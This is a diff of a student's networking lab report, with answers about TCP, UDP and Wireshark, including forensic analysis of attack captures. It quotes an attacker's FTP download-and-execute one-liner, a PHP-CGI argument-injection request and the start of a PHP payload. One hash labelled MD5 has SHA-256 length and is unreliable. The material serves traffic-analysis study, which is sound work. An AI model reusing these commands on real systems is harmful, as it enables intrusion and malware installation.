@@ -86,11 +86,11 @@ What is the sequence number of the SYNACK segment sent by gaia.cs.umass.edu to t
 
 What is the value of the ACKnowledgement field in the SYNACK segment? How did gaia.cs.umass.edu determine that value?
 
-- Acknowledgment number: 1
+- **Acknowledgment number: 1**
 
 What is it in the segment that identifies the segment as a SYNACK segment? (Check flags)
 
-- The flags _Syn_ and _Acknowledgement_ flag are _Set_ (1)
+- **The flags _Syn_ and _Acknowledgement_ flag are _Set_ (1)**
 
 ### Exercise 4
 
@@ -106,7 +106,7 @@ Consider the TCP segment containing the HTTP POST as the first segment in the TC
 What are the sequence numbers of the first six segments in the TCP
 connection (including the segment containing the HTTP POST)? At what time was each segment sent? When was the ACK for each segment received? Given the difference between when each TCP segment was sent, and when its acknowledgement was received, what is the RTT value for each of the three segments? What is the EstimatedRTT value after 3rd segment in the TCP connection?
 
-  - The EstimatedRTT value after the 3rd segment is 0.007555 seconds.
+  - **The EstimatedRTT value after the 3rd segment is 0.007555 seconds.**
   
     | Segment | Sequence Number | Sent (Time) | ACK Received Time | RTT (s)  |
     | ------- | --------------- | ----------- | ----------------- | -------- |
@@ -131,28 +131,28 @@ What are the lengths of TCP segments?
 From this packet, determine how many fields there are
 in the UDP header. Name these fields.
 
-- 4 fields: Source port, Destination Port, Length, Checksum
+- **4 fields: Source port, Destination Port, Length, Checksum**
 
 
 ## Excercise 8 - 10
 
 From the packet content field, determine the length (in
 bytes) of each of the UDP header fields.
-  - All fields have a length of 2 bytes
+  - **All fields have a length of 2 bytes**
 
 The value in the Length field is the length of what?
-- Length of the UDP header and UDP data (between 8 and 65,535 bytes)
+- **Length of the UDP header and UDP data (between 8 and 65,535 bytes)**
 
 Verify your claim with your captured UDP packet.
-- The value of the Length UDP header is 49. The length of the header is 8 bytes and the length of the UDP Data is 41 bytes. 
-- UDP Data (_"safebrowsing.google.com"_)
+- **The value of the Length UDP header is 49. The length of the header is 8 bytes and the length of the UDP Data is 41 bytes. **
+- **UDP Data (_"safebrowsing.google.com"_)**
   ```
   17 61 01 00 00 01 00 00 00 00 00 00 0c 73 61 66 65 62 72 6f 77 73 69 6e 67 06 67 6f 6f 67 6c 65 03 63 6f 6d 00 00 01 00 01
   ```
 
 What is the protocol number for UDP? Give your
 answer in both hexadecimal and decimal notation.
-- Hexadecimal: 11, Decimal: 17
+- **Hexadecimal: 11, Decimal: 17**
 
 # Lab 3
 Multi-Threaded Web Server
@@ -317,44 +317,44 @@ final class HttpRequest implements Runnable {
 ## Exercise 1
 
 Identify the IP addresses of the attacker and the target.
-- 192.168.223.171 (attacker) and 192.168.223.172 (target)
+- **192.168.223.171 (attacker) and 192.168.223.172 (target)**
 How many connection attempts have been made by the attacker?
-- 65530
+- **65530**
 How many of the ports are open?
-- 30 
+- **30 using the following filter:** 
   ```
   ip.src==192.168.223.172 and ip.dst==192.168.223.171 and tcp.flags.syn==1
   ```
 Identify / guess the services running on the open ports.
-- ssh, mysql, ftp, postgresql, telnet, sunrpc, etc.
+- **ssh, mysql, ftp, postgresql, telnet, sunrpc, etc.**
 
 ## Exercise 2
 
 Which IP addresses are involved?
-  - 98.114.205.102, 192.150.11.111
+  - **98.114.205.102, 192.150.11.111**
 
 What is the duration of the packet capture?
-  - 16.2192 seconds
+  - **16.2192 seconds**
 
 Which application-layer protocols are detected by Wireshark?
-  - SMB (Server Message Block Protocol)
-  - NetBIOS, Distributed Computing Environemnt, (DCE/RPC), Active Directory Setup
+  - **SMB (Server Message Block Protocol)**
+  - **NetBIOS, Distributed Computing Environemnt, (DCE/RPC), Active Directory Setup**
 
 How many TCP sessions are in the file?
-  - 5
+  - **5**
 
 Identify the attacker’s IP address and location (use a free online tool such as ip2location.com).
-  - United States, Pennsylvania	Philadelphia, lat: 39.9523, lng: -75.1638
+  - **United States, Pennsylvania	Philadelphia, lat: 39.9523, lng: -75.1638**
 
 
 Check the conversation content in TCP stream #3. Which application-level protocol is used?
-  - SQL Server Management Studio
+  - **SQL Server Management Studio**
 
 Identify the attacker’s and the victim’s native operating system and version (Hint: check packets 16 and 17)
-  - Windows 5.1 (Victim) and Windows 2000 2195 (Attacker)
+  - **Windows 5.1 (Victim) and Windows 2000 2195 (Attacker)**
 
 Identify the script used by the attacker after compromising the system. (Hint: TCP stream 2)
-  - Script used:
+  - **Script used:**
     ```
     echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
     ssms.exe
@@ -387,7 +387,7 @@ Identify the script used by the attacker after compromising the system. (Hint: T
     ```
 
 A malware binary is downloaded by the host at TCP stream #4. Obtain a copy of the file (might trigger your anti-virus if not using VM). Get the md5 sum of the binary and identify it at virustotal.com.
-  - MD5 of _smss.exe_: 
+  - **MD5 of _smss.exe_: **
     ```
     b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d
     ```
@@ -398,14 +398,14 @@ A malware binary is downloaded by the host at TCP stream #4. Obtain a copy of th
 ## Exercise 3
 
 List the hosts (IP addresses) in the traffic.
-  - 10.142.0.1, 10.142.0.2, 10.142.0.3
+  - **10.142.0.1, 10.142.0.2, 10.142.0.3**
 
 Identify the packet that sends the initial malicious query.
-  - Packet information:
+  - **Packet information:**
     ``` 
     6	2013-04-29 14:00:34.295022	10.142.0.2	10.142.0.1	HTTP	1432	POST /?--define+allow_url_include%3don+-%64+safe_mode%3doff+--define+suhosin.simulation%3d1+--define+disable_functions%3d%22%22+-d+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-%6e++ HTTP/1.1  (application/x-www-form-urlencoded)
     ```
-  - PHP Script
+  - **PHP Script**
     ```php
     <?php
     error_reporting(0);
@@ -467,8 +467,45 @@ Identify the packet that sends the initial malicious query.
 
 
 Identify the attacker (malicious client) and the victim (web server).
-  - Attacker: 10.142.0.2, Victim: 	10.142.0.1
+  - **Attacker: 10.142.0.2, Victim: 	10.142.0.1**
 
 (optional) Analyze the contents of the packet containing malicious query. What do you think is the effect of the query on the web server? How does the attacker follow-up on the initial malicious query?
-    - Creates a socket connection on ip port 4444 to listen to messages 
-  
+    - **Creates a socket connection on ip port 4444 to listen to messages **
+
+## Exercise 4
+
+What are the IP addresses of victim and attacker?
+  - **10.10.10.10 (attacker), 10.10.10.70 (victim)**
+
+What is the address of the victim’s original HTTP request (i.e. the malicious web server)?
+  - **http://10.10.10.10:8080/index.php**
+The victim made a second request for another HTTP object. What is the file’s name and type?
+  - **http://10.10.10.10:8080/index.phpmfKSxSANkeTeNrah.gif, which has a file name of _index.phpmfKSxSANkeTeNrah.gif_ that has a _gif_ type**
+
+What is the name and version of the victim’s browser?
+  - **Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)**
+
+What is the operating system of the victim? Hint: Look out for a broadcast address.
+  - **Windows NT 5.1; SV1**
+
+How long was the TCP session at port 4444?
+  - 86.3216 seconds
+
+The infected victim made repeated attempts to connect to the server via port 4445. When was the relative time of the first attempt, and how long did the attempts continue until the victim made a successful connection?
+  - First attempt at 35.947 seconds, last unsucessful attempt at 121.706 seconds, after which a successful attempt was made at 122.690 seconds
+
+
+
+The server replied with a page containing obfuscated Javascript. An array with the length 1300 is created with the label ‘COMMENT’. What string does the array’s "data" section contain?
+
+
+
+
+
+
+
+
+
+Two files were sent to the client. Identify the types of the files. (Check packet #17, and the connection on port 4445)
+
+Extract the content and md5 sums of both files and use Virustotalto analyze them (might trigger your anti-virus if not using VM).Hint: First two bytes in the TCP conversation denote the file length in little endian notation.
